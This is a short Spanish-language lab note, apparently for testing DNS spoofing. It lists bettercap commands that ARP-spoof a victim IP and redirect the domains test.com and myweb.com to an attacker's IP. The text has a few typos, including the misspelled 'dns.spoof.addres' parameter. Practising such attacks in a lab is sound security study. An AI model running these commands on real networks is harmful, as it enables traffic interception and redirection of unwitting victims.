# Test DNS spoofing

## Preparar entorno

- Ejecutar betercap

```
sudo bettercap
```

- Agregar los Ip victimas
```
set arp.spoof.targets [IP_victima]
arp.spoof on
set dns.spoof.domains test.com,myweb.com
set dns.spoof.addres [IP_atacante]
dns.spoof on
```
